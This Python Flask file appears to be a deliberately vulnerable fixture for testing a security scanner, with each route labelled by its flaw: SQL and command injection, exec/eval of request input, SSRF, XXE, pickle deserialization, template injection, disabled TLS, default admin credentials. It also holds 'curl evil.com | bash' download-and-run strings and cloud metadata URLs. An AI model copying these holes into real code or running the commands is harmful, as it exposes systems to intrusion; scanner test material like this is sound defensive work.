from flask import Flask, request, jsonify, redirect, render_template_string, make_response
import os, subprocess, pickle, yaml, json, hashlib, random, re, logging, zipfile
import xml.etree.ElementTree as ET
import requests
import jwt
import ldap
from jinja2 import Template

app = Flask(__name__)
DEBUG = True  # Debug Mode in Production
logging.disable(logging.CRITICAL)  # Logging Disabled

DEFAULT_CREDS = {"admin": "admin"}  # Default Credentials

# Admin route without explicit guard
@app.route("/admin")
def admin_panel():
    return "admin"

@app.route("/login")
def login():
    username = request.args.get("username")
    password = request.args  # Password in URL (pattern match)

    # SQL Injection
    query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + request.args.get("password") + "'"
    cursor.execute(query)

    # Broken Access Control
    user = Model.objects.get(id=request.args.get("user_id"))

    # Code Injection
    exec(request.args.get("exec_code"))

    # Code Injection via eval
    eval(request.args.get("eval_code"))

    # XSS
    return render_template_string(request.args.get("q"))

@app.route("/cmd")
def cmd_exec():
    host = request.args.get("host")
    os.system("ping -c 1 " + host)  # OS Command Injection
    return "ok"

@app.route("/ssrf")
def ssrf():
    url = request.args.get("url")
    return requests.get(url).text  # SSRF

@app.route("/xxe", methods=["POST"])
def xxe():
    xml_data = request.data
    ET.parse(xml_data)  # XXE
    return "ok"

@app.route("/deserialize", methods=["POST"])
def des():
    blob = request.data
    pickle.loads(blob)  # Insecure Deserialization
    return "ok"

@app.route("/weakcrypto")
def weak_crypto():
    return hashlib.md5(request.args.get("data", "").encode()).hexdigest()  # Weak Crypto

@app.route("/ldap")
def ldap_inject():
    user = request.args.get("user")
    ldap.search(user)  # LDAP Injection
    return "ok"

@app.route("/mass")
def mass_assignment():
    Model.objects.create(**request.json)  # Mass Assignment
    return "ok"

@app.route("/cors")
def cors():
    resp = make_response("ok")
    resp.headers["Access-Control-Allow-Origin"] = "*"  # CORS Misconfig
    return resp

@app.route("/tmpl")
def ssti():
    return Template(request.args.get("tpl")).render()  # Template Injection

@app.route("/nosql")
def nosql():
    collection.find({"$where": request.args.get("q")})  # NoSQL Injection
    return "ok"

@app.route("/redirect")
def open_redirect():
    return redirect(request.args.get("next"))  # Unvalidated Redirect

@app.route("/upload", methods=["POST"])
def upload():
    f = request.files["file"]
    f.save("/tmp/" + f.filename)  # Unrestricted File Upload
    return "ok"

@app.route("/cookie")
def cookie():
    resp = make_response("ok")
    resp.set_cookie("session", "abc")  # Insecure Cookie
    return resp

def sensitive_data_exposure(user):
    return json.dumps({"password": user.password, "token": user.token})  # Sensitive Data Exposure

def log_injection(user_input):
    logging.getLogger().info("User: " + user_input)  # Log Injection

def sensitive_logging(password):
    logging.getLogger().warning("password=" + password)  # Sensitive Data in Logs

def path_traversal(path):
    return open(path, "r").read()  # Path Traversal

def zip_slip(archive_path):
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall("/tmp/extract")  # Zip Slip

def regex_dos(user_input):
    re.compile(user_input).search("a" * 10000)  # ReDoS

def cleartext_transmission():
    return requests.get("http://example.com/password?token=abc")  # Cleartext Transmission

def disabled_tls():
    return requests.get("https://example.com", verify=False)  # Disabled TLS Validation

def jwt_weak():
    return jwt.encode({"user": "a"}, "short", algorithm="HS256")  # JWT Weak Secret

def jwt_none(token):
    return jwt.decode(token, options={"verify_signature": False}, algorithms=["none"])  # JWT None

def hardcoded_iv():
    iv = "1234567890abcdef"  # Hard-coded IV
    return iv

def remote_script_exec():
    cmd = "curl http://evil.com/install.sh | bash"  # Remote Script Execution
    return cmd

def untrusted_binary_exec():
    script = "curl http://evil.com/app -o app\nchmod +x app\n./app"  # Untrusted Binary Execution
    return script

def aws_metadata():
    return "http://169.254.169.254/latest/meta-data"  # AWS Metadata Access

def gcp_metadata():
    return "http://metadata.google.internal"  # GCP Metadata Access

def azure_metadata():
    return "http://169.254.169.254/metadata/instance"  # Azure Metadata Access

def imds_tokenless():
    return "X-aws-ec2-metadata-token"  # IMDS Tokenless Request

@app.errorhandler(500)
def error_handler(e):
    return str(e)  # Info Exposure Through Error Messages

def except_pass():
    try:
        1 / 0
    except Exception:
        pass  # Exceptions Suppressed Without Logging
